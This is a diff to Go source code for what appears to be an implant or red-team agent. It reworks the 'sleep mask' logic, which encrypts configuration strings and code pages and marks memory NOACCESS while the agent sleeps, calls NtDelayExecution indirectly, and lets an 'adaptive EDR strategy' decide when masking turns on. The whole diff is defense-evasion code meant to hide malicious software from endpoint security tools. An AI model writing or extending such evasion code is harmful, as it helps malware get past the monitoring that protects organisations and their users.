@@ -35,10 +35,11 @@ var (
 	smInitMu sync.Mutex
 )
 
+// InitSleepMask prepares the platform sleep-mask infrastructure: a
+// VirtualAlloc'd shadow buffer holding the sensitive config strings, parked
+// NOACCESS while awake. Whether masked sleeping actually engages is a separate
+// policy decision (sleepMaskPolicyEnabled / activateSleepMask).
 func InitSleepMask() bool {
-	if !enableSleepMask {
-		return false
-	}
 	smInitMu.Lock()
 	defer smInitMu.Unlock()
 	if smState.ready {
@@ -63,18 +64,14 @@ func InitSleepMask() bool {
 	smState.storeSensitiveData()
 	smState.ready = true
 
-	// Promote the full-image AES sleep mask to default when available (amd64
-	// Windows): it encrypts all committed code/data pages during sleep, which
-	// is far stronger than the 4096-byte config-buffer mask.
-	if advancedMaskFactory != nil {
-		if m := advancedMaskFactory(); m != nil {
-			activeSleepMask = m
-			fullImageMaskActive = true
-		}
-	}
-
 	procVirtualProtect.Call(ptr, maskBufferSize, pageNoaccess)
 	return true
+}
+
+// sleepMaskPolicyEnabled reports whether the adaptive EDR strategy opted in
+// to masked sleeping (enableSleepMask is set by ApplyStrategy).
+func sleepMaskPolicyEnabled() bool {
+	return enableSleepMask
 }
 
 func (sm *sleepMaskState) storeSensitiveData() {
@@ -142,21 +139,14 @@ func (sm *sleepMaskState) xorCrypt(buf []byte) {
 	}
 }
 
+// sleepWithMask encrypts the config buffer, sleeps through the active mask
+// (indirect NtDelayExecution on Windows), then restores the buffer. The active
+// mask is always non-nil after package init.
 func sleepWithMask(d time.Duration) {
-	if activeSleepMask != nil {
-		activeSleepMask.Encrypt()
-		activeSleepMask.BeforeSleep(uintptr(d.Milliseconds()))
-		activeSleepMask.AfterWake()
-		activeSleepMask.Decrypt()
-		return
-	}
-	sleepMaskEncrypt()
-	if sleepObfFunc != nil {
-		sleepObfFunc(uintptr(d.Milliseconds()))
-	} else {
-		procSleep.Call(uintptr(d.Milliseconds()))
-	}
-	sleepMaskDecrypt()
+	activeSleepMask.Encrypt()
+	activeSleepMask.BeforeSleep(uintptr(d.Milliseconds()))
+	activeSleepMask.AfterWake()
+	activeSleepMask.Decrypt()
 }
 
 func init() {
@@ -165,19 +155,6 @@ func init() {
 	sleepObfFunc = func(ms uintptr) {
 		indirectNtDelayExecution(time.Duration(ms) * time.Millisecond)
 	}
-}
-
-// advancedMaskFactory, when set by the windows/amd64 build, returns the
-// full-image AES sleep mask. It is promoted to the default mask in
-// InitSleepMask so the agent's own code pages are encrypted during sleep
-// (not just the 4096-byte config buffer). Only windows builds populate or
-// read it, so the declaration lives in this windows-tagged file.
-var advancedMaskFactory func() SleepMasker
-
-// registerSleepMask is the windows-side hook for the full-image technique
-// providers (advanced/foliage/zilean); it feeds the shared kit mask registry.
-func registerSleepMask(name string, factory func() SleepMasker) {
-	maskRegistry[name] = factory
 }
 
 var (
